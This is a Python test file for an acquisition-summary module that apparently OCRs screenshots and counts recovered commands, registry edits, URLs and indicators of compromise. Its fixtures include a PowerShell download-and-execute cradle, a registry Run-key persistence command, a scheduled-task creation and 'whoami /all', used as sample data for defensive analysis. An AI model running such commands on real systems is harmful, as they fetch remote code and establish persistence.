"""P0.15C-2 · Acquisition Summary · release-gate tests."""
from __future__ import annotations

import pytest
from services.veee.summary import compute_summary


# ══════════════════════════════════════════════════════════════════
# Tolerance of missing data (contract §0.2 · "Not available" · UI-friendly)
# ══════════════════════════════════════════════════════════════════
def test_empty_inputs_return_all_zero_summary():
    s = compute_summary()
    sec = s["sections"]
    assert s["schema_version"] == "1.0"
    assert s["veee_enabled"] is False
    assert s["structured_blocks"] == 0
    assert sec["html"]        == {"paragraphs": 0, "tables": 0, "code_blocks": 0}
    assert sec["images"]["found"] == 0
    assert sec["images"]["processed"] == 0
    assert sec["images"]["skipped"]   == 0
    assert sec["recovered"] == {"commands": 0, "powershell": 0, "registry": 0,
                                    "urls": 0, "hashes": 0, "iocs": 0}
    assert sec["quality"]["average_ocr_confidence"]      == 0.0
    assert sec["quality"]["ocr_commands_extracted"]      == 0
    assert sec["quality"]["canonicalized_successfully"]  == 0
    assert sec["quality"]["classification_success_rate"] == 0.0
    assert sec["performance"] == {"processing_time_ms": 0.0,
                                       "cache_hits": 0, "cache_misses": 0}


def test_none_inputs_never_raise():
    s1 = compute_summary(None, None, None)
    s2 = compute_summary(structured_blocks=None, veee_records=None)
    assert s1["schema_version"] == "1.0"
    assert s2["schema_version"] == "1.0"


# ══════════════════════════════════════════════════════════════════
# HTML section counters
# ══════════════════════════════════════════════════════════════════
def test_html_section_counts_paragraphs_tables_and_code_blocks():
    html = "<p>A</p><p>B</p><table><tr><td>x</td></tr></table><pre>x</pre><code>y</code>"
    s = compute_summary(html_text=html)
    assert s["sections"]["html"] == {"paragraphs": 2, "tables": 1, "code_blocks": 2}


# ══════════════════════════════════════════════════════════════════
# VEEE records → images / recovered / quality
# ══════════════════════════════════════════════════════════════════
def _rec(**kwargs):
    prov = {"source": "image", "acquisition_level": "P3",
            "image_url": "https://x/1.png", "image_sha256": "abc",
            "bounding_box": {"x": 0, "y": 0, "w": 1, "h": 1},
            "ocr_engine": "tesseract-5", "ocr_confidence": 0.9}
    prov.update(kwargs.get("provenance") or {})
    return {"type": kwargs.get("type", "commandline"),
            "text": kwargs.get("text", ""),
            "provenance": prov}


def test_images_and_recovered_derived_from_records():
    records = [
        _rec(text="powershell.exe -nop -c iex(iwr http://x)"),
        _rec(text="reg add HKLM\\Software\\...\\Run /v X /d y /f"),
        _rec(text="schtasks /create /tn Y /tr Z"),
        _rec(text="ping 1.2.3.4 -n 1"),
        _rec(type="skipped", text="", provenance={"skipped": True, "reason": "not_code_screenshot"}),
        _rec(type="skipped", text="", provenance={"skipped": True, "reason": "not_code_screenshot"}),
    ]
    s = compute_summary(veee_records=records)
    sec = s["sections"]
    assert sec["images"]["ocr_candidates"] == 6
    assert sec["images"]["processed"]      == 4
    assert sec["images"]["skipped"]        == 2
    assert sec["images"]["skipped_reasons"] == {"not_code_screenshot": 2}
    assert sec["recovered"]["commands"]   == 4
    assert sec["recovered"]["powershell"] >= 1
    assert sec["recovered"]["registry"]   >= 1
    assert sec["recovered"]["urls"]       >= 1
    assert sec["recovered"]["iocs"]       >= 1


def test_quality_kpis_amendment_5():
    records = [
        _rec(text="powershell.exe -c ..."),                        # canonicalizable
        _rec(text="cmd.exe /c echo hi"),                            # canonicalizable
        _rec(text="something random that isnt a shell command"),    # NOT canonicalizable
    ]
    s = compute_summary(veee_records=records)
    q = s["sections"]["quality"]
    assert q["ocr_commands_extracted"] == 3
    assert q["canonicalized_successfully"] == 2
    # 2/3 = 66.7
    assert q["classification_success_rate"] == pytest.approx(66.7, abs=0.1)


# ══════════════════════════════════════════════════════════════════
# UI-friendly: never raises, always shape-stable
# ══════════════════════════════════════════════════════════════════
def test_summary_shape_is_stable_across_permutations():
    for records in [[], [{"type": "commandline", "text": ""}],
                       [_rec(text="whoami /all")]]:
        s = compute_summary(veee_records=records)
        for k in ("schema_version", "veee_enabled", "structured_blocks", "sections"):
            assert k in s
        for k in ("html", "images", "recovered", "quality", "performance",
                     "pipeline_health"):
            assert k in s["sections"]


# ══════════════════════════════════════════════════════════════════
# P0.15C-2 · Refinement · Pipeline Stage Health
# Display-only per-stage status derived from existing counters.
# ══════════════════════════════════════════════════════════════════
def _health(s):
    return s["sections"]["pipeline_health"]


def test_pipeline_health_empty_all_not_available():
    h = _health(compute_summary())
    for stage in ("html", "images", "ocr", "canonicalizer", "classifier"):
        assert h[stage]["status"] == "not_available"


def test_pipeline_health_flag_off_no_records_marks_veee_stages_disabled():
    h = _health(compute_summary(veee_enabled=False, html_text="<p>x</p>"))
    # HTML acquired successfully even when VEEE is off.
    assert h["html"]["status"] == "completed"
    # VEEE-owned stages report "disabled" instead of "not_available"
    # when the flag is explicitly off.
    for stage in ("images", "ocr", "canonicalizer", "classifier"):
        assert h[stage]["status"] == "disabled"


def test_pipeline_health_flag_on_all_stages_completed():
    records = [
        _rec(text="powershell.exe -c ..."),
        _rec(text="cmd.exe /c echo hi"),
    ]
    s = compute_summary(veee_enabled=True, veee_records=records,
                            html_text="<p>x</p>", images_seen_in_html=2)
    h = _health(s)
    assert h["html"]["status"]          == "completed"
    assert h["images"]["status"]        == "completed"
    assert h["ocr"]["status"]           == "completed"
    assert h["canonicalizer"]["status"] == "completed"
    assert h["classifier"]["status"]    == "completed"


def test_pipeline_health_partial_ocr_and_canonicalizer():
    # 1 processed + 1 skipped OCR → OCR = partial
    # 1 canonicalizable command out of 1 → canonicalizer = completed
    records = [
        _rec(text="powershell.exe -c ..."),
        _rec(type="skipped", text="",
                 provenance={"skipped": True, "reason": "not_code_screenshot"}),
    ]
    h = _health(compute_summary(veee_enabled=True, veee_records=records))
    assert h["ocr"]["status"]           == "partial"
    assert h["canonicalizer"]["status"] == "completed"


def test_pipeline_health_failed_canonicalizer_when_no_commands_canonicalized():
    # Commands were extracted but none look like a known head.
    records = [
        _rec(text="something random that isnt a shell command"),
        _rec(text="also not a command"),
    ]
    h = _health(compute_summary(veee_enabled=True, veee_records=records))
    # OCR still completed (both processed), but canonicalizer failed.
    assert h["ocr"]["status"]           == "completed"
    assert h["canonicalizer"]["status"] == "failed"
    assert h["classifier"]["status"]    == "failed"


def test_pipeline_health_status_carries_detail_string():
    records = [_rec(text="powershell.exe -c iex")]
    h = _health(compute_summary(veee_enabled=True, veee_records=records))
    # Every stage carries a non-empty detail string for the UI tooltip.
    for stage in ("html", "images", "ocr", "canonicalizer", "classifier"):
        assert isinstance(h[stage].get("detail"), str)


def test_pipeline_health_never_raises_on_malformed_records():
    # A record with no provenance and no text should NOT crash the summary.
    s = compute_summary(veee_enabled=True,
                              veee_records=[{"type": "commandline"}])
    h = _health(s)
    # No canonicalizable text → canonicalizer failed on 1 extracted command.
    assert h["canonicalizer"]["status"] in ("failed", "not_available")


def test_veee_enabled_explicit_flag_overrides_records_heuristic():
    # Records present but flag explicitly off → veee_enabled True (activity),
    # but pipeline_health respects the explicit flag for VEEE stages.
    records = [_rec(text="whoami /all")]
    # When the caller passes veee_enabled=True explicitly, the top-level
    # ``veee_enabled`` field mirrors it.
    s_on  = compute_summary(veee_enabled=True,  veee_records=records)
    s_off = compute_summary(veee_enabled=False, veee_records=[])
    assert s_on["veee_enabled"]  is True
    assert s_off["veee_enabled"] is False
